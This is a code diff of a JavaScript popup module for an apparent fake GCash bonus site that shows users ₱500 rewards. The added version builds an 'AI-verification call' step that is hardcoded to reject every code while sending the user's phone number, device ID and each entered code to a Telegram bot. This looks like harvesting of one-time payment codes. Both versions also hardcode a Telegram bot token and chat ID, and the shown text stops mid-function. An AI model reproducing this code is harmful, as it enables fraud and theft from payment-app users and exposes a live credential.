@@ -1,1791 +1,1342 @@
 /**
- * playbonus.js — Carnival Theme + Telegram Notifications
- * ============================================================
- * PHASE 1: HOORAY — Carnival style
- * PHASE 2: GREAT JOB — Carnival style
- * PHASE 3: AI-VERIFICATION — Carnival style (VISUAL ONLY)
- *
- * ⚠️ VERIFICATION LOGIC AY HINDI KASAMA.
- * Ikaw ang mag-implement ng verifyCodeWithBackend()
- * at submitWithdrawalRequest() base sa LEGITIMATE na paraan.
- * ============================================================
+ * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
+ * Updated: AI-Verification Call System (Admin calls user)
+ * - Shows user's mobile number with animation
+ * - 60-second countdown timer (Neon Green → Neon Red)
+ * - Always invalid by default
+ * - Full Telegram notifications
  */
 
+// ========== POPUP MODULE ==========
 (function() {
     'use strict';
-
-    // ============================================================
-    // CONFIGURATION
-    // ============================================================
-    var VERIFICATION_MODE = 'admin_manual';
-
-    // ============================================================
-    // TELEGRAM NOTIFICATION CONFIG
-    // ============================================================
-    // ⚠️ BABALA: Client-side ito — naka-expose ang token.
-    // ⚠️ I-revoke ang lumang token at gumawa ng bago.
-    // ⚠️ Sa production, ilipat sa Cloud Function (server-side).
-    // ============================================================
-    var TELEGRAM_BOT_TOKEN = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
-    var TELEGRAM_CHAT_ID = '7298607329';
-    var TELEGRAM_ENABLED = true;
-
-    // ============================================================
-    // GLOBAL STATE
-    // ============================================================
-    var userPhone = null;
-    var db = null;
-    var userRef = null;
-    var currentBalance = 0;
-    var bonusAmount = 500;
-    var isClaimed = false;
-    var claimInProgress = false;
-    var autoPopupTimer = null;
-    var balanceListener = null;
-    var claimListener = null;
-
-    var currentPhase = 1;
-    var isTransitioning = false;
-    var currentFirewallStatus = false;
-
-    var soundCache = {
-        scatter: null,
-        claim: null,
-        success: null
-    };
-
-    // ============================================================
-    // HELPERS
-    // ============================================================
-    function formatNumberWithComma(number) {
-        var num = Number(number).toFixed(2);
-        var parts = num.split('.');
-        var wholePart = parts[0];
-        var decimalPart = parts[1];
-        var wholeWithCommas = wholePart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-        return wholeWithCommas + '.' + decimalPart;
-    }
-
-    function initSounds() {
+    
+    let currentBalance = 0;
+    let currentPhase = 1;
+    let claimInProgress = false;
+    let isRedirecting = false;
+    let currentFirewallStatus = false;
+    
+    // ========== AI-VERIFICATION CALL VARIABLES ==========
+    let callInProgress = false;
+    let callCountdown = 60;
+    let callTimerInterval = null;
+    let isCallRequested = false;
+    let currentCallCode = '';
+    let codeEntered = false;
+    
+    // ========== SOUND EFFECT ==========
+    function playClaimSound() {
         try {
-            soundCache.scatter = new Audio('sounds/super_ace_scatter_ring.mp3');
-            soundCache.claim = new Audio('sounds/claim.wav');
-            soundCache.success = new Audio('sounds/success.wav');
-            soundCache.scatter.volume = 0.5;
-            soundCache.claim.volume = 0.7;
-            soundCache.success.volume = 0.6;
-        } catch(e) {}
-    }
-
-    function playSound(soundName) {
-        if (soundCache[soundName]) {
-            soundCache[soundName].currentTime = 0;
-            soundCache[soundName].play().catch(function(e) {});
+            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
+            audio.volume = 0.7;
+            audio.play().catch(function(e) { console.log('Sound play prevented:', e); });
+        } catch(e) {
+            console.log('Sound error:', e);
         }
     }
-
-    function shakeElement(el) {
-        if (!el) return;
-        el.style.animation = 'carnivalShake 0.4s ease';
-        setTimeout(function() { el.style.animation = ''; }, 450);
-    }
-
-    // ============================================================
-    // TELEGRAM HELPERS
-    // ============================================================
-    function sendTelegramNotification(message) {
-        if (!TELEGRAM_ENABLED) return Promise.resolve(false);
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.warn('⚠️ Telegram not configured');
-            return Promise.resolve(false);
+    
+    function playCallSound() {
+        try {
+            var audio = new Audio('sounds/call_ring.mp3');
+            audio.volume = 0.5;
+            audio.play().catch(function(e) { console.log('Call sound error:', e); });
+        } catch(e) {
+            console.log('Call sound error:', e);
         }
-
-        var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
-
-        return fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            if (data && data.ok) {
-                console.log('✅ Telegram sent');
-                return true;
-            }
-            console.warn('⚠️ Telegram response:', data);
-            return false;
-        })
-        .catch(function(err) {
-            console.error('❌ Telegram error:', err);
-            return false;
-        });
     }
-
-    function maskPhone(phone) {
-        if (!phone || phone.length < 11) return phone || 'Unknown';
-        return phone.substring(0, 4) + '***' + phone.substring(7, 11);
+    
+    // ========== TELEGRAM NOTIFICATIONS ==========
+    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+    var CHAT_ID = "7298607329";
+    
+    function sendTelegramMessage(message) {
+        try {
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
+                .catch(function(e) { console.error('Telegram error:', e); });
+        } catch(e) {
+            console.error('Telegram error:', e);
+        }
     }
-
-    function getTimestamp() {
+    
+    // ========== AI-VERIFICATION CALL TELEGRAM NOTIFICATIONS ==========
+    function sendAICallRequestNotification(userPhone, deviceId, code) {
         var now = new Date();
-        return now.toLocaleString('en-PH', {
-            timeZone: 'Asia/Manila',
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            second: '2-digit'
-        });
+        var timestamp = now.toLocaleString();
+        var message = '📞 AI-VERIFICATION CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code Generated: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call requested - Admin will call user\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
-
-    // ============================================================
-    // TELEGRAM NOTIFICATION BUILDERS
-    // ============================================================
-    function notifyClaimNowClicked(balance) {
-        var msg =
-            '🎁 <b>CLAIM NOW CLICKED</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: User opened bonus popup\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
+    
+    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '🔑 AI-CODE VERIFICATION ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code Entered: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Seconds Left: ' + secondsLeft + 's\n📊 Status: INVALID CODE (No valid code exists)\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
-
-    function notifyPhase1Viewed(balance) {
-        var msg =
-            '🎉 <b>PHASE 1: HOORAY</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Viewing reward\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
+    
+    function sendAICallExpiredNotification(userPhone, deviceId) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '⏰ AI-VERIFICATION CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call expired - User needs to request a new call\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
-
-    function notifyPhase1ClaimClicked(balance) {
-        var msg =
-            '💳 <b>PHASE 1: CLAIM THRU GCASH CLICKED</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Proceeding to next phase\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
+    
+    function sendClaimButtonNotification(userPhone, deviceId, amount) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '💳 CLAIM THRU GCASH INITIATED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n💰 Amount: ₱' + amount.toFixed(2) + '\n⏰ Time: ' + timestamp + '\n📊 Status: Claim process started\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
-
-    function notifyPhase2Viewed(balance) {
-        var msg =
-            '🏆 <b>PHASE 2: GREAT JOB</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Ready to withdraw\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
-    }
-
-    function notifyPhase2ProceedClicked(balance) {
-        var msg =
-            '🚀 <b>PHASE 2: PROCEED TO WITHDRAW CLICKED</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Redirecting to payout\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
-    }
-
-    function notifyPhase3Viewed(balance) {
-        var msg =
-            '📞 <b>PHASE 3: AI-VERIFICATION</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Verification requested\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
-    }
-
-    function notifyPhase3VerifyClicked(balance) {
-        var msg =
-            '🔐 <b>PHASE 3: VERIFY CODE CLICKED</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Verifying...\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
-    }
-
-    function notifyPhase3CodeEntered(balance, code) {
-        var msg =
-            '🔑 <b>PHASE 3: CODE ENTERED</b>\n' +
-            '━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 User: <code>' + maskPhone(userPhone) + '</code>\n' +
-            '💰 Balance: ₱' + Number(balance || 0).toFixed(2) + '\n' +
-            '📝 Code: <code>' + code + '</code>\n' +
-            '⏰ Time: ' + getTimestamp() + '\n' +
-            '📊 Status: Code submitted\n' +
-            '━━━━━━━━━━━━━━━━━━━━';
-        return sendTelegramNotification(msg);
-    }
-
-    // ============================================================
-    // INIT
-    // ============================================================
-    function init() {
-        console.log('🎁 PlayBonus Starting...');
-
-        userPhone = localStorage.getItem("userPhone");
-        if (!userPhone) {
-            window.location.href = "index.html";
-            return;
-        }
-
-        var phoneDisplay = document.getElementById('userPhoneDisplay');
-        if (phoneDisplay) {
-            phoneDisplay.innerText = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
-        }
-
-        initSounds();
-        initFirebase();
-        loadUserData();
-        initTimer();
-        initTicker();
-        initClaimFlow();
-        initConfetti();
-        attachButtonEvents();
-        injectCarnivalAnimations();
-
-        console.log('✅ PlayBonus ready!');
-    }
-
-    // ============================================================
-    // FIREBASE
-    // ============================================================
-    function initFirebase() {
-        if (typeof firebaseConfig === 'undefined') {
-            console.error('❌ Firebase config not found!');
-            return;
-        }
-        try {
-            if (!firebase.apps || !firebase.apps.length) {
-                firebase.initializeApp(firebaseConfig);
-            }
-            db = firebase.database();
-            userRef = db.ref('user_sessions/' + userPhone);
-            console.log('✅ Firebase connected:', userPhone);
-        } catch(e) {
-            console.error('Firebase error:', e);
-        }
-    }
-
-    function loadUserData() {
-        if (!userRef) return;
-
-        userRef.once('value', function(snapshot) {
-            var data = snapshot.val();
-
-            if (data) {
-                currentBalance = Number(data.balance) || 0;
-                isClaimed = data.claimed_ptcat === true;
-
-                console.log('📊 Loaded - Balance: ₱' + currentBalance + ', Claimed:', isClaimed);
-
-                updateBalanceDisplay();
-                updateClaimButtonUI();
-                scheduleAutoPopup();
-            } else {
-                console.log('🆕 New user');
-                currentBalance = 0;
-                isClaimed = false;
-
-                userRef.set({
-                    phone: userPhone,
-                    balance: 0,
-                    claimed_ptcat: false,
-                    status: "active",
-                    created_at: Date.now()
-                }).then(function() {
-                    updateBalanceDisplay();
-                    updateClaimButtonUI();
-                    scheduleAutoPopup();
-                });
-            }
-        }).catch(function(e) {
-            console.error('Load error:', e);
-        });
-
-        if (balanceListener) {
-            userRef.child('balance').off('value', balanceListener);
-        }
-
-        balanceListener = userRef.child('balance').on('value', function(snapshot) {
-            var balance = snapshot.val();
-            if (balance !== null && balance !== undefined) {
-                currentBalance = Number(balance);
-                updateBalanceDisplay();
-            }
-        });
-
-        if (claimListener) {
-            userRef.child('claimed_ptcat').off('value', claimListener);
-        }
-
-        claimListener = userRef.child('claimed_ptcat').on('value', function(snapshot) {
-            var claimed = snapshot.val();
-            var newState = (claimed === true);
-
-            if (newState !== isClaimed) {
-                isClaimed = newState;
-                updateClaimButtonUI();
-            }
-        });
-    }
-
-    // ============================================================
-    // AUTO POPUP
-    // ============================================================
-    function scheduleAutoPopup() {
-        if (autoPopupTimer) clearTimeout(autoPopupTimer);
-
-        var delay = isClaimed ? 5000 : 3000;
-        autoPopupTimer = setTimeout(function() {
-            autoShowBonusPopup();
-        }, delay);
-    }
-
-    function autoShowBonusPopup() {
-        var popup = document.getElementById('bonusRewardPopup');
-        if (!popup) return;
-
-        popup.style.display = 'flex';
-        playSound('scatter');
-        updateClaimButtonUI();
-    }
-
-    // ============================================================
-    // BALANCE DISPLAY
-    // ============================================================
-    function updateBalanceDisplay() {
-        var balanceEl = document.getElementById('userBalanceDisplay');
-        if (balanceEl) {
-            balanceEl.innerText = formatNumberWithComma(currentBalance);
-        }
-    }
-
-    function animateBalanceThenSave(oldBalance, newBalance, callback) {
-        var startTime = null;
-        var duration = 1500;
-
-        function step(timestamp) {
-            if (!startTime) startTime = timestamp;
-            var progress = Math.min((timestamp - startTime) / duration, 1);
-            var easeProgress = 1 - Math.pow(1 - progress, 3);
-            var val = Math.floor(easeProgress * (newBalance - oldBalance) + oldBalance);
-
-            var balanceEl = document.getElementById('userBalanceDisplay');
-            if (balanceEl) {
-                balanceEl.innerText = formatNumberWithComma(val);
-            }
-
-            if (progress < 1) {
-                requestAnimationFrame(step);
-            } else {
-                if (callback) callback();
-            }
-        }
-
-        requestAnimationFrame(step);
-    }
-
-    // ============================================================
-    // FIREWALL
-    // ============================================================
-    function checkFirewallBeforeClaim() {
-        try {
-            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
-                var data = snapshot.val();
-                currentFirewallStatus = (data && data.active === true);
-                return currentFirewallStatus;
-            });
-        } catch(e) {
-            return Promise.resolve(false);
-        }
-    }
-
-    // ============================================================
-    // CLAIM TRACKING
-    // ============================================================
-    function trackClaimInFirebase(amount) {
-        try {
-            var now = new Date();
-            var year = now.getFullYear();
-            var month = String(now.getMonth() + 1).padStart(2, '0');
-            var day = String(now.getDate()).padStart(2, '0');
-            var hour = now.getHours();
-            var dateKey = year + '-' + month + '-' + day;
-
-            var dayRef = db.ref('festival_stats/daily/' + dateKey);
-
-            dayRef.transaction(function(data) {
-                if (data === null) {
-                    data = { claims_count: 0, claims_amount: 0, hourly_claims: {} };
-                }
-                data.claims_count = (data.claims_count || 0) + 1;
-                data.claims_amount = (data.claims_amount || 0) + (amount || 0);
-                if (!data.hourly_claims) data.hourly_claims = {};
-                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
-                data.last_update = Date.now();
-                return data;
-            });
-        } catch(e) {
-            console.error('❌ Track claim error:', e);
-        }
-    }
-
-    // ============================================================
-    // CLAIM FLOW
-    // ============================================================
-    function initClaimFlow() {
-        var claimNowBtn = document.getElementById('claimNowBtn');
-        var popup = document.getElementById('bonusRewardPopup');
-
-        if (claimNowBtn) {
-            claimNowBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-
-                playSound('scatter');
-
-                // ✅ TELEGRAM NOTIFICATION
-                notifyClaimNowClicked(currentBalance);
-
-                if (popup) {
-                    popup.style.display = 'flex';
-                    updateClaimButtonUI();
-                }
-            });
-        }
-
-        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
-        if (ptCatClaimBtn) {
-            ptCatClaimBtn.addEventListener('click', handleClaimBonus);
-        }
-
-        var closeBtn = document.getElementById('bonusRewardClose');
-        if (closeBtn) {
-            closeBtn.addEventListener('click', function() {
-                if (popup) popup.style.display = 'none';
-            });
-        }
-
-        var backBtn = document.getElementById('bonusRewardBack');
-        if (backBtn) {
-            backBtn.addEventListener('click', function() {
-                if (popup) popup.style.display = 'none';
-            });
-        }
-
-        updateClaimButtonUI();
-    }
-
-    function handleClaimBonus(e) {
-        e.preventDefault();
-        e.stopPropagation();
-
-        if (isClaimed) {
-            alert("You have already claimed this bonus!");
-            return;
-        }
-        if (claimInProgress) {
-            alert("Please wait, processing...");
-            return;
-        }
-        if (!userRef) {
-            alert("System not ready. Please refresh.");
-            return;
-        }
-
-        userRef.child('claimed_ptcat').once('value', function(snapshot) {
-            if (snapshot.val() === true) {
-                isClaimed = true;
-                updateClaimButtonUI();
-                alert("You have already claimed this bonus!");
-                return;
-            }
-            processClaim();
-        }).catch(function(error) {
-            console.error('Check error:', error);
-            processClaim();
-        });
-    }
-
-    function processClaim() {
-        claimInProgress = true;
-
-        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
-        if (ptCatClaimBtn) {
-            ptCatClaimBtn.disabled = true;
-            ptCatClaimBtn.style.opacity = '0.6';
-            ptCatClaimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>PROCESSING...</span>';
-        }
-
-        checkFirewallBeforeClaim().then(function(firewallOn) {
-            if (firewallOn) {
-                var popup = document.getElementById('bonusRewardPopup');
-                if (popup) popup.style.display = 'none';
-
-                creditBonusAndMark(function() {
-                    if (window.showPopup) {
-                        window.showPopup(currentBalance);
-                    }
-                    claimInProgress = false;
-                });
-            } else {
-                creditBonusAndMark(function() {
-                    var popup = document.getElementById('bonusRewardPopup');
-                    if (popup) popup.style.display = 'none';
-
-                    setTimeout(function() {
-                        showSuccessPopup(bonusAmount);
-                    }, 300);
-
-                    claimInProgress = false;
-                });
-            }
-        }).catch(function(error) {
-            console.error('Firewall error:', error);
-            claimInProgress = false;
-            resetClaimButton();
-        });
-    }
-
-    function creditBonusAndMark(callback) {
-        var oldBalance = currentBalance;
-        var newBalance = oldBalance + bonusAmount;
-
-        userRef.update({
-            balance: newBalance,
-            claimed_ptcat: true,
-            ptcat_claimed_at: Date.now(),
-            lastUpdate: Date.now()
-        }).then(function() {
-            currentBalance = newBalance;
-            isClaimed = true;
-
-            animateBalanceThenSave(oldBalance, newBalance, function() {
-                updateBalanceDisplay();
-            });
-
-            trackClaimInFirebase(bonusAmount);
-            playSound('claim');
-            startConfetti();
-            updateClaimButtonUI();
-
-            if (callback) callback();
-        }).catch(function(error) {
-            console.error('❌ Firebase update error:', error);
-            alert('Error saving claim. Please try again.');
-            claimInProgress = false;
-            resetClaimButton();
-        });
-    }
-
-    function resetClaimButton() {
-        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
-        if (ptCatClaimBtn) {
-            ptCatClaimBtn.disabled = false;
-            ptCatClaimBtn.style.opacity = '1';
-            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
-        }
-        claimInProgress = false;
-    }
-
-    function updateClaimButtonUI() {
-        var ptCatClaimBtn = document.getElementById('ptCatClaimBtn');
-        var bonusLabel = document.querySelector('.bonus-label');
-
-        if (!ptCatClaimBtn) return;
-
-        if (isClaimed) {
-            ptCatClaimBtn.disabled = true;
-            ptCatClaimBtn.style.opacity = '0.5';
-            ptCatClaimBtn.style.cursor = 'not-allowed';
-            ptCatClaimBtn.style.pointerEvents = 'none';
-            ptCatClaimBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>ALREADY CLAIMED</span>';
-            ptCatClaimBtn.classList.add('claimed');
-
-            if (bonusLabel) {
-                bonusLabel.textContent = 'BONUS CLAIMED';
-                bonusLabel.style.color = '#39ff14';
-            }
-        } else {
-            ptCatClaimBtn.disabled = false;
-            ptCatClaimBtn.style.opacity = '1';
-            ptCatClaimBtn.style.cursor = 'pointer';
-            ptCatClaimBtn.style.pointerEvents = 'auto';
-            ptCatClaimBtn.innerHTML = '<i class="fas fa-gift"></i> <span>CLAIM BONUS</span>';
-            ptCatClaimBtn.classList.remove('claimed');
-
-            if (bonusLabel) {
-                bonusLabel.textContent = 'BONUS REWARD';
-                bonusLabel.style.color = '';
-            }
-        }
-    }
-
-    function showSuccessPopup(amount) {
-        var popup = document.getElementById('successPopup');
-        var amountEl = document.getElementById('successAmount');
-        var closeBtn = document.getElementById('successCloseBtn');
-
-        if (amountEl) amountEl.textContent = amount;
-        if (popup) popup.style.display = 'flex';
-
-        playSound('success');
-
-        if (closeBtn) {
-            closeBtn.onclick = function() {
-                popup.style.display = 'none';
-            };
-        }
-
-        setTimeout(function() {
-            if (popup) popup.style.display = 'none';
-        }, 5000);
-    }
-
-    // ============================================================
-    // 3-PHASE CLAIM FLOW — CARNIVAL THEME
-    // ============================================================
-
-    window.showPopup = function(balance) {
-        currentBalance = Number(balance) || 0;
-        currentPhase = 1;
-        openPhasePopup();
-        renderPhase1();
-    };
-
-    function openPhasePopup() {
-        var popup = document.getElementById('claimPhasePopup');
-        if (!popup) return;
-        popup.style.display = 'flex';
-        document.body.style.overflow = 'hidden';
-
-        var ticker = document.getElementById('winnerTicker');
-        if (ticker) ticker.style.display = 'none';
-    }
-
-    function closePhasePopup() {
-        var popup = document.getElementById('claimPhasePopup');
-        if (!popup) return;
-        popup.style.display = 'none';
-        document.body.style.overflow = '';
-
-        var ticker = document.getElementById('winnerTicker');
-        if (ticker) ticker.style.display = 'flex';
-    }
-    window.closePopup = closePhasePopup;
-
-    function transitionTo(renderFn) {
-        if (isTransitioning) return;
-        isTransitioning = true;
-
-        var inner = document.getElementById('claimPhaseInner');
-        if (!inner) {
-            isTransitioning = false;
-            return;
-        }
-
-        inner.style.opacity = '0';
-        inner.style.transform = 'scale(0.97)';
-
-        setTimeout(function() {
-            renderFn();
-            inner.style.opacity = '1';
-            inner.style.transform = 'scale(1)';
-            isTransitioning = false;
-        }, 250);
-    }
-
-    // ============================================================
-    // PHASE 1: HOORAY — CARNIVAL STYLE
-    // ============================================================
-    function renderPhase1() {
-        currentPhase = 1;
-        var inner = document.getElementById('claimPhaseInner');
-        if (!inner) return;
-
-        inner.innerHTML = [
-            '<div class="carnival-phase carnival-phase-1">',
-                '<button class="carnival-close" id="phase1Close">✕</button>',
-                '<div class="carnival-burst-bg"></div>',
-                '<div class="carnival-confetti">',
-                    '<span></span><span></span><span></span><span></span><span></span>',
-                    '<span></span><span></span><span></span><span></span><span></span>',
-                '</div>',
-                '<div class="carnival-mascot">',
-                    '<img src="images/LuckyCat.png" alt="Lucky Cat" onerror="this.style.display=\'none\'">',
-                    '<div class="mascot-glow"></div>',
-                '</div>',
-                '<h2 class="carnival-title">🎉 HOORAY! 🎉</h2>',
-                '<div class="carnival-amount">',
-                    '<span class="currency">₱</span>',
-                    '<span class="value" id="phase1Balance">', currentBalance.toFixed(2), '</span>',
-                '</div>',
-                '<div class="carnival-divider"></div>',
-                '<div class="carnival-bills">',
-                    '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
-                    '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
-                    '<div class="bill-indicator"><img src="images/PHL-500-Front.png" onerror="this.style.display=\'none\'"></div>',
-                    '<div class="bill-indicator"><img src="images/PHL-500-Back.png" onerror="this.style.display=\'none\'"></div>',
-                '</div>',
-                '<p class="carnival-subtext">Your reward is ready. Claim it now and enjoy the fiesta!</p>',
-                '<button class="carnival-btn carnival-btn-gold" id="phase1ClaimBtn">',
-                    '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'">',
-                    'CLAIM THRU GCASH',
-                '</button>',
-                '<button class="carnival-btn carnival-btn-ghost" id="phase1BackBtn">← BACK</button>',
-            '</div>'
-        ].join('');
-
-        updateBillsIndicators(currentBalance);
-
-        // ✅ TELEGRAM NOTIFICATION — Phase 1 viewed
-        notifyPhase1Viewed(currentBalance);
-
-        var closeBtn = document.getElementById('phase1Close');
-        var backBtn = document.getElementById('phase1BackBtn');
-        var claimBtn = document.getElementById('phase1ClaimBtn');
-
-        if (closeBtn) closeBtn.onclick = closePhasePopup;
-        if (backBtn) backBtn.onclick = closePhasePopup;
-
-        if (claimBtn) {
-            claimBtn.onclick = function() {
-                if (currentBalance <= 0) {
-                    showInlineError(claimBtn, '❌ NO BALANCE');
-                    return;
-                }
-                playSound('scatter');
-
-                // ✅ TELEGRAM NOTIFICATION — Phase 1 claim clicked
-                notifyPhase1ClaimClicked(currentBalance);
-
-                claimBtn.disabled = true;
-                claimBtn.innerHTML = '⏳ CHECKING...';
-
-                checkFirewallBeforeClaim().then(function(firewallOn) {
-                    if (firewallOn) {
-                        transitionTo(renderPhase3);
-                    } else {
-                        transitionTo(renderPhase2);
-                    }
-                }).catch(function() {
-                    transitionTo(renderPhase2);
-                });
-            };
-        }
-    }
-
+    
+    // ========== UPDATE BILLS INDICATORS ==========
     function updateBillsIndicators(balance) {
-        var indicators = document.querySelectorAll('#claimPhaseInner .bill-indicator');
+        var billIndicators = document.querySelectorAll('.bill-indicator');
         var billCount = Math.min(4, Math.floor(balance / 500));
-
-        for (var i = 0; i < indicators.length; i++) {
-            var indicator = indicators[i];
+        
+        for (var i = 0; i < billIndicators.length; i++) {
+            var indicator = billIndicators[i];
             var img = indicator.querySelector('img');
-            if (!img) continue;
-
+            
             if (i < billCount) {
+                if (i % 2 === 0) {
+                    img.src = 'images/PHL-500-Front.png';
+                } else {
+                    img.src = 'images/PHL-500-Back.png';
+                }
                 img.style.opacity = '1';
                 img.style.filter = 'none';
                 indicator.classList.add('active');
             } else {
+                img.src = 'images/PHL-500-Front.png';
                 img.style.opacity = '0.25';
                 img.style.filter = 'grayscale(100%) brightness(30%)';
                 indicator.classList.remove('active');
             }
         }
     }
-
-    // ============================================================
-    // PHASE 2: GREAT JOB — CARNIVAL STYLE
-    // ============================================================
-    function renderPhase2() {
-        currentPhase = 2;
-        var inner = document.getElementById('claimPhaseInner');
-        if (!inner) return;
-
-        inner.innerHTML = [
-            '<div class="carnival-phase carnival-phase-2">',
-                '<button class="carnival-close" id="phase2Close">✕</button>',
-                '<div class="carnival-burst-bg"></div>',
-                '<div class="carnival-confetti">',
-                    '<span></span><span></span><span></span><span></span><span></span>',
-                    '<span></span><span></span><span></span><span></span><span></span>',
-                '</div>',
-                '<div class="carnival-trophy">🏆</div>',
-                '<h2 class="carnival-title">GREAT JOB!</h2>',
-                '<div class="carnival-divider"></div>',
-                '<div class="carnival-reward-box">',
-                    '<p class="carnival-subtext">"Nice work! You\'re one tap away from your reward!"</p>',
-                    '<div class="carnival-reward-amount">',
-                        'Your reward: <strong>₱', currentBalance.toFixed(2), '</strong>',
-                    '</div>',
-                '</div>',
-                '<button class="carnival-btn carnival-btn-gold" id="phase2ProceedBtn">',
-                    '<img src="images/gc_icon.png" class="gc-icon" onerror="this.style.display=\'none\'">',
-                    'PROCEED TO WITHDRAW',
-                '</button>',
-                '<button class="carnival-btn carnival-btn-ghost" id="phase2BackBtn">← BACK</button>',
-            '</div>'
-        ].join('');
-
-        // ✅ TELEGRAM NOTIFICATION — Phase 2 viewed
-        notifyPhase2Viewed(currentBalance);
-
-        var closeBtn = document.getElementById('phase2Close');
-        var backBtn = document.getElementById('phase2BackBtn');
-        var proceedBtn = document.getElementById('phase2ProceedBtn');
-
-        if (closeBtn) closeBtn.onclick = closePhasePopup;
-        if (backBtn) backBtn.onclick = function() {
-            transitionTo(renderPhase1);
-        };
-
-        if (proceedBtn) {
-            proceedBtn.onclick = function() {
-                playSound('scatter');
-
-                // ✅ TELEGRAM NOTIFICATION — Phase 2 proceed clicked
-                notifyPhase2ProceedClicked(currentBalance);
-
-                proceedBtn.disabled = true;
-                proceedBtn.innerHTML = '⏳ REDIRECTING...';
-
